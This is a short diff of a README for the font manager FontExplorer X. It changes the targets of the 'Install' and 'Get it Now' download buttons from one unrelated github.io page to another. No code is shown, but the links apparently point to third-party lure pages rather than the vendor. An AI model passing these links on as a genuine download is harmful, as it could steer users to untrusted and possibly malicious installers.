@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/fontExplorerX)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://six-sevens.github.io/.github/fontExplorerX)
 
 </div>
 
@@ -81,7 +81,7 @@ The core problem FontExplorer X solves is one that scales with library size: hav
 
 <p align="center">
 
-[![Get it Now FontExplorer X](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/fontExplorerX)
+[![Get it Now FontExplorer X](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/fontExplorerX)
 
 </p>
 
